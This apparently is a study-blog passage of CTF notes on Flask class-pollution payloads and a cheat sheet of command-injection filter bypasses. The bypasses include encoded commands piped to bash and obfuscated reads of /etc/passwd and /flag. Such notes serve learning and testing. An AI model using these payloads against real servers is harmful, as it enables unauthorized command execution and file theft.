class="keyword">from</span> flask <span class="keyword">import</span> Flask,request</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="comment"># Recursive merge function</span></span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">cls</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">instance = cls()</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;Is flag here?&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.before_first_request</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">init</span>():</span><br><span class="line">    <span class="keyword">global</span> flag</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">hasattr</span>(app, <span class="string">&quot;special&quot;</span>) <span class="keyword">and</span> app.special == <span class="string">&quot;U_Polluted_It&quot;</span>:</span><br><span class="line">        flag = <span class="built_in">open</span>(<span class="string">&quot;flag&quot;</span>, <span class="string">&quot;rt&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">if</span> request.data:</span><br><span class="line">        merge(json.loads(request.data), instance)</span><br><span class="line">    <span class="keyword">global</span> flag</span><br><span class="line">    <span class="built_in">setattr</span>(app, <span class="string">&quot;special&quot;</span>, <span class="string">&quot;U_Polluted_It&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> flag</span><br><span class="line"></span><br><span class="line">app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>)</span><br><span class="line">payload=&#123;</span><br><span class="line">    <span class="string">&quot;__init__&quot;</span>:&#123;</span><br><span class="line">        <span class="string">&quot;__globals__&quot;</span>:&#123;</span><br><span class="line">            <span class="string">&quot;app&quot;</span>:&#123;</span><br><span class="line">                <span class="string">&quot;_got_first_request&quot;</span>:<span class="literal">False</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="static-url-path"><a href="#static-url-path" class="headerlink" title="_static_url_path:"></a>_static_url_path:</h3><p>当python指定了static静态目录以后，我们再进行访问就会定向到static文件夹下面的对应文件而不会存在目录穿梭的漏洞，但是如果我们想要访问其他文件下面的敏感信息，我们就需要污染这个静态目录，让他自动帮我们实现定向</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#static/index.html</span></span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;h1&gt;hello&lt;/h1&gt;</span><br><span class="line">&lt;body&gt;    </span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">if</span> request.data:</span><br><span class="line">        merge(json.loads(request.data), instance)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;flag in ./flag but heres only static/index.html&quot;</span></span><br><span class="line">payload=&#123;</span><br><span class="line">    <span class="string">&quot;__init__&quot;</span>:&#123;</span><br><span class="line">        <span class="string">&quot;__globals__&quot;</span>:&#123;</span><br><span class="line">            <span class="string">&quot;app&quot;</span>:&#123;</span><br><span class="line">                <span class="string">&quot;_static_folder&quot;</span>:<span class="string">&quot;./&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="os-path-pardir"><a href="#os-path-pardir" class="headerlink" title="os.path.pardir:"></a>os.path.pardir:</h3><p>套一下师傅的示例脚本来学习一下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#app.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,request</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="comment"># Recursive merge function</span></span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">cls</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">instance = cls()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">if</span> request.data:</span><br><span class="line">        merge(json.loads(request.data), instance)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;flag in ./flag but heres only static/index.html&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>)</span><br></pre></td></tr></table></figure><p>我们进行目录穿梭进行访问发现报了500的错误：这个地方就是模板渲染的时候，防止目录穿梭进行的一个操作，而我们的os.path.pardir恰好是我们的..所以会进行报错，所以我们如果把这个地方进行修改为除..外的任意值，我们就可以进行目录穿梭了。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">payload=&#123;</span><br><span class="line">    <span class="string">&quot;__init__&quot;</span>:&#123;</span><br><span class="line">        <span class="string">&quot;__globals__&quot;</span>:&#123;</span><br><span class="line">            <span class="string">&quot;os&quot;</span>:&#123;</span><br><span class="line">                <span class="string">&quot;path&quot;</span>:&#123;</span><br><span class="line">                    <span class="string">&quot;pardir&quot;</span>:<span class="string">&quot;,&quot;</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Jinja语法标识符："><a href="#Jinja语法标识符：" class="headerlink" title="Jinja语法标识符："></a>Jinja语法标识符：</h2>我们在学习SSTI的时候，语法标识符\{\{\}\}是解析jinja语法重要的一个东西，那么我们能不能对这个东西进行修改呢：在Jinja的文档中，提到了对Jinja环境类的相关属性问题，文档中提到说，如果此类的实例未共享并且尚未加载模板的话，我们就可以修改此类的实例<p><img src="https://sl0wjamz.oss-cn-hangzhou.aliyuncs.com/img/image-20241020144210517.png" alt="image-20241020144210517"></p><p>而师傅在文章中又提到了对Flask底层的一个研究，就是在Flask中使用的Flask类的装饰器以后，jinja_env方法实现了上述的功能点：</p><p>我们跟进下create_jinja_environment()函数，发现<code>jinja_env</code>方法返回值就是<code>Jinja</code>中的环境类：<code>jinja_environment = Environment</code>，所以我们可以直接采用类似<code>Flask.jinja_env.variable_start_string = &quot;xxx&quot;</code>来实现对<code>Jinja</code>语法标识符进行替换</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#templates/index.html</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Look this -&gt; [[flag]] &lt;- try to make it become the real flag<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>    </span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#app.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,request,render_template</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="comment"># Recursive merge function</span></span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">cls</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">instance = cls()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">if</span> request.data:</span><br><span class="line">        merge(json.loads(request.data), instance)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;go check /index before merge it&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/index&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">templates</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;test.html&quot;</span>, flag = <span class="built_in">open</span>(<span class="string">&quot;flag&quot;</span>, <span class="string">&quot;rt&quot;</span>).read())</span><br><span class="line"></span><br><span class="line">app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>)</span><br></pre></td></tr></table></figure>我们想要通过{{flag}}的话，就需要将语法标识符进行替换，这里我们就将语法标识符从{{}}，替换为[[]]这样的话，[[flag]]就能够像{{flag}}一样被解析了。<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;__init__&quot;</span> : &#123;</span><br><span class="line">        <span class="string">&quot;__globals__&quot;</span> : &#123;</span><br><span class="line">            <span class="string">&quot;app&quot;</span> : &#123;</span><br><span class="line">                    <span class="string">&quot;jinja_env&quot;</span> :&#123;</span><br><span class="line"><span class="string">&quot;variable_start_string&quot;</span> : <span class="string">&quot;[[&quot;</span>,<span class="string">&quot;variable_end_string&quot;</span>:<span class="string">&quot;]]&quot;</span></span><br><span class="line">&#125;        </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>注意：</p><p>但是在Flask框架当中，他会对模板文件编译后进行一定的缓存，下次再需要渲染的时候，直接使用缓存里面的模板文件，这样的话我们修改后语法标识符里面的flag变量并没有被放到缓存当中，所以没有自动填充flag，所以我们需要在Flask启动以后先输入payload再访问路由，这样就可以做到先污染再访问模板</p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RCE Bypass</title>
      <link href="/2024/02/26/rce_bypass/"/>
      <url>/2024/02/26/rce_bypass/</url>
      
        <content type="html"><![CDATA[<h1 id="命令空格绕过"><a href="#命令空格绕过" class="headerlink" title="命令空格绕过"></a>命令空格绕过</h1><h2 id="bash下"><a href="#bash下" class="headerlink" title="bash下"></a>bash下</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$&#123;IFS&#125;</span><span class="variable">$9</span></span><br><span class="line">&#123;IFS&#125;</span><br><span class="line"><span class="variable">$IFS</span></span><br><span class="line"><span class="variable">$&#123;IFS&#125;</span></span><br><span class="line">$IFS<span class="variable">$1</span> //<span class="variable">$1</span>改成$加其他数字貌似都行</span><br><span class="line">IFS</span><br><span class="line">&lt; </span><br><span class="line">&lt;&gt; </span><br><span class="line">&#123;<span class="built_in">cat</span>,flag.php&#125;  //用逗号实现了空格功能，需要用&#123;&#125;括起来</span><br><span class="line">%20   (space)</span><br><span class="line">%09   (tab) /r</span><br><span class="line">X=$<span class="string">&#x27;cat\x09./flag.php&#x27;</span>;<span class="variable">$X</span>       （\x09表示tab，也可以用\x20）</span><br><span class="line">/**/</span><br></pre></td></tr></table></figure><h1 id="命令连接"><a href="#命令连接" class="headerlink" title="命令连接"></a>命令连接</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">win and linux</span><br><span class="line">;     前面的执行完执行后面的 </span><br><span class="line">|     管道符，上一条命令的输出，作为下一条命令的参数（显示后面的执行结果）         </span><br><span class="line">||    当前面的执行出错时（为假）执行后面的</span><br><span class="line">&amp;     将任务置于后台执行</span><br><span class="line">&amp;&amp;    前面的语句为假则直接出错，后面的也不执行，前面只能为真</span><br><span class="line">%0a  （换行）</span><br><span class="line">%0d  （回车）</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>关于|：</p><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240715134329275.png" alt="image-20240715134329275"></p><p>而<code>ping 127.0.0.1 | ls /</code>成功执行的原因是但是，<code>ls /</code> 并不需要任何输入，它会立即执行并完成。</p><h1 id="特定字符绕过"><a href="#特定字符绕过" class="headerlink" title="特定字符绕过"></a>特定字符绕过</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ca\t /fl\ag  <span class="comment">//转义</span></span><br><span class="line">a=c;b=a;c=t;$a$b<span class="variable">$c</span> /etc/passwd</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Y2F0IC9ldGMvcGFzc3dk&#x27;</span> | base64 -d | bash</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Y2F0IC9ldGMvcGFzc3dk&#x27;</span> | base64 -d | sh <span class="comment">//linux</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;636174202f666c6167&quot;</span> | xxd -r -p | bash <span class="comment">//16进制，注意hex后的0x不需要 cat /flag</span></span><br><span class="line">$(printf <span class="string">&#x27;\154\163&#x27;</span>) <span class="comment">//oct,八进制，ls。注意要单引号，否则bash识别不了。$()等同于``</span></span><br><span class="line">`printf <span class="string">&#x27;\154\163&#x27;</span>` <span class="comment">//printf &#x27;\154\163&#x27;是不会换行的，会输出ls%，要printf &#x27;\154\163\n&#x27;</span></span><br><span class="line">$(printf <span class="string">&#x27;\x6c\x73&#x27;</span>) <span class="comment">//当然也可以16进制 ls</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240715142111579.png" alt="image-20240715142111579"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">(sy.(st).em)(<span class="built_in">whoami</span>);一般用于非shell环境，如上</span><br><span class="line"></span><br><span class="line">c<span class="string">&#x27;&#x27;</span>a<span class="string">&#x27;&#x27;</span>t /etc/passwd //两个单引号</span><br><span class="line">c``a``t /etc/passwd // 两个反斜杠</span><br><span class="line">c<span class="string">&quot;&quot;</span>a<span class="string">&quot;&quot;</span>t /etc/passwd // 两个双引号</span><br></pre></td></tr></table></figure><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240715143714016.png" alt="image-20240715143714016"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">注意只能在shell环境下执行。system不行，如上图。</span><br><span class="line">$*和<span class="variable">$@</span>，<span class="variable">$x</span>(x 代表 1-9),<span class="variable">$&#123;x&#125;</span>(x&gt;=10) :比如ca<span class="variable">$&#123;21&#125;</span>t a.txt表示<span class="built_in">cat</span> a.txt 在没有传入参数的情况下,这些特殊字符默认为空,如下:</span><br><span class="line">wh<span class="variable">$1oami</span></span><br><span class="line"><span class="built_in">who</span><span class="variable">$@ami</span></span><br><span class="line">whoa$*mi</span><br><span class="line"></span><br><span class="line">666`<span class="built_in">whoami</span>`666 //bash: 666root666: <span class="built_in">command</span> not found</span><br><span class="line"></span><br><span class="line">666`\<span class="built_in">whoami</span>`666 //bash: 666root666: <span class="built_in">command</span> not found</span><br><span class="line"></span><br><span class="line">//命令执行后的结果在2个666中间</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">插入注释（这对于绕过阻止特定PHP函数名称的WAF规则集很有用）</span><br><span class="line"></span><br><span class="line">system/*A10ng_*/(<span class="built_in">whoami</span>);</span><br><span class="line"></span><br><span class="line">system/*A10ng_*/(wh./*A10ng_*/(oa)/*caixukun*/.mi);</span><br><span class="line"></span><br><span class="line">(sy./*A10ng_*/(st)/*A10ng_*/.em)/*A10ng_*/(wh./*A10ng_*/(oa)/*A10ng_*/.mi); //注意不要写在正里面，cmd=(sy.(s).tem)(wh.(o).a/*void2eye*/mi);，要写成cmd=(sy.(s).tem)(wh.(o)/*void2eye*/.ami);</span><br></pre></td></tr></table></figure><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240715154456280.png" alt="image-20240715154456280"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">利用未初始化变量，使用<span class="variable">$u</span>绕过</span><br><span class="line"><span class="built_in">cat</span> /etc<span class="variable">$u</span>/passwd</span><br><span class="line">----------------------------------------------</span><br><span class="line">过滤了斜杠‘/’</span><br><span class="line">可利用<span class="string">&#x27;;&#x27;</span>拼接命令绕过</span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> ..;<span class="built_in">cd</span> ..;<span class="built_in">cd</span> ..;<span class="built_in">cd</span> ..;<span class="built_in">cd</span> etc;<span class="built_in">cat</span> passwd</span><br><span class="line">---------------------------------------------</span><br><span class="line">利用通配符绕过：(能用的很少)</span><br><span class="line">列如<span class="built_in">cat</span> /passwd：</span><br><span class="line"></span><br><span class="line">??? /e??/?a????</span><br><span class="line"><span class="built_in">cat</span> /e*/pa*</span><br><span class="line"></span><br><span class="line">-------------------------------------------------</span><br><span class="line">glob通配符：</span><br><span class="line">在glob里</span><br><span class="line"></span><br><span class="line">“ [A-Fa-f0-9] ”相当于 <span class="string">&quot; [ABCDEFabcdef0123456789] &quot;</span>.)</span><br><span class="line"></span><br><span class="line">“ [-%] ”代表“ [!”#$%] ”而“ [a-z] ”代表“任何 小写字母”</span><br><span class="line"></span><br><span class="line">利用[@-[]来表示大写字母：</span><br><span class="line"></span><br><span class="line">[...]表示匹配方括号之中的任意一个字符</span><br><span class="line"></span><br><span class="line">&#123;…&#125;表示匹配大括号里面的所有模式，模式之间使用逗号分隔。</span><br><span class="line"></span><br><span class="line">&#123;...&#125;与[...]有一个重要的区别，当匹配的文件不存在，[...]会失去模式的功能，变成一个单纯的字符串，而&#123;...&#125;依然可以展开</span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> t[a-z]st</span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> t&#123;a,b,c,d,e,f&#125;st</span><br><span class="line"></span><br><span class="line">// 注意这个是用来匹配文件名的，比如<span class="built_in">ls</span> <span class="built_in">log</span>[0-9]</span><br><span class="line">// <span class="built_in">cat</span> file&#123;1,2,3&#125;.txt</span><br><span class="line"></span><br><span class="line">----------------------------------------------------------------------</span><br><span class="line">利用PATH绕过</span><br><span class="line">可以通过截断和拼接来得到我们想要的来getshell</span><br><span class="line"></span><br><span class="line"><span class="variable">$&#123;PATH:5:1&#125;</span> //l</span><br><span class="line"></span><br><span class="line"><span class="variable">$&#123;PATH:2:1&#125;</span> //s</span><br><span class="line"></span><br><span class="line"><span class="variable">$&#123;PATH:5:1&#125;</span><span class="variable">$&#123;PATH:2:1&#125;</span> //拼接后是<span class="built_in">ls</span>,执行命令</span><br><span class="line"></span><br><span class="line"><span class="variable">$&#123;PATH:5:1&#125;</span>s //拼接后是<span class="built_in">ls</span>,执行命令</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240715160531062.png" alt="image-20240715160531062"></p><h1 id="无数字字母rce"><a href="#无数字字母rce" class="headerlink" title="无数字字母rce"></a>无数字字母rce</h1><h2 id="自增绕过："><a href="#自增绕过：" class="headerlink" title="自增绕过："></a>自增绕过：</h2><p>‘a’++ &#x3D;&gt; ‘b’，’b’++ &#x3D;&gt; ‘c’… 所以，我们只要能拿到一个变量，其值为a，通过自增操作即可获得a-z中所有字符。</p><p>那么，如何拿到一个值为字符串’a’的变量呢？</p><p>巧了，数组（Array）的第一个字母就是大写A，而且第4个字母是小写a。也就是说，我们可以同时拿到小写和大写A，等于我们就可以拿到a-z和A-Z的所有字母。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_</span>=[].[]; <span class="comment">//俩数组拼接强行返回ArrayArray,这里一个短杠的值也就是ArrayArray</span></span><br><span class="line"><span class="variable">$__</span>=<span class="string">&#x27;&#x27;</span>;  <span 